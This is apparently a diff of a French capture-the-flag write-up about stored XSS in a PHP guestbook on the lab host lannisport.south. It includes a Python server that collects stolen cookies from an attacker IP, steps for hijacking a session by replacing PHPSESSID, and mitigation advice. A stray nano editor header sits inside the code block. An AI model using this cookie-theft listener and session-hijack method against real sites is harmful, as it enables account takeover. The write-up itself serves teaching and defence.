@@ -9,8 +9,8 @@ Pour cela, il injecte un **XSS stocké** dans le **livre d’or** afin de récup
 ---
 
 ## ⚙️ Environnement
-- **Cible :** lannisport.south
-- **Page vulnérable :** livre_dor.php
+- **Cible :** `lannisport.south`
+- **Page vulnérable :** `livre_dor.php`
 - **Langage :** PHP / JavaScript
 
 ---
@@ -36,22 +36,29 @@ L’attaquant met en place un **serveur d’écoute** pour récupérer les cooki
 
 🔹 **Script Python sur Kali** :
 ```python
+  GNU nano 8.3                                                                  capture/capture_server.py                                                                           
 from http.server import BaseHTTPRequestHandler, HTTPServer
+import urllib.parse
 
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
-        if "cookie" in self.path:
-            cookie = self.path.split("=")[1]
+        self.send_response(200)
+        self.send_header("Content-Type", "text/plain")
+        self.send_header("Access-Control-Allow-Origin", "*")  # Permet les requêtes CORS
+        self.end_headers()
+
+        if "cookie=" in self.path:
+            cookie = self.path.split("cookie=", 1)[1]  # Prend toute la valeur du cookie après "cookie="
+            cookie = urllib.parse.unquote(cookie)  # Décode les caractères URL-encoded (%3D devient =)
             print(f"Cookie volé : {cookie}")
             with open("stolen_cookies.txt", "a") as f:
                 f.write(cookie + "\n")
-        self.send_response(200)
-        self.end_headers()
 
-server_address = ('10.10.10.20', 8000)
-httpd = HTTPServer(server_address, Handler)
-print("[+] Serveur en écoute sur le port 8000...")
-httpd.serve_forever()
+if __name__ == "__main__":
+    server_address = ('10.10.10.20', 8000)  # IP Kali
+    httpd = HTTPServer(server_address, Handler)
+    print("Serveur en écoute sur le port 8000...")
+    httpd.serve_forever()
 ```
 *Veuillez changer l'**IP** en fonction de celle mise sur Kali*
 
@@ -94,8 +101,8 @@ driver.quit()
 cat stolen_cookies.txt
 ```
 ✅ **Utilisation du cookie volé pour usurper la session du garde** :
-- Ouvrir les outils développeur (F12) > **Application** > **Cookies**.
-- Modifier PHPSESSID avec la valeur capturée.
+- Ouvrir les outils développeur (`F12`) > **Application** > **Cookies**.
+- Modifier `PHPSESSID` avec la valeur capturée.
 - Recharger la page.
 
 **🚀 Succès ! L’attaque est réalisée et le flag récupéré !** 🔥
@@ -103,8 +110,8 @@ cat stolen_cookies.txt
 ---
 
 ## 🔒 Mitigation & Sécurisation
-- **Activer HttpOnly sur les cookies** pour empêcher l’accès JavaScript.
-- **Filtrer les entrées utilisateur** (htmlspecialchars()) pour empêcher le XSS.
+- **Activer `HttpOnly` sur les cookies** pour empêcher l’accès JavaScript.
+- **Filtrer les entrées utilisateur** (`htmlspecialchars()`) pour empêcher le XSS.
 - **Utiliser CSP (Content Security Policy)** pour bloquer les scripts inline.
 
 ---
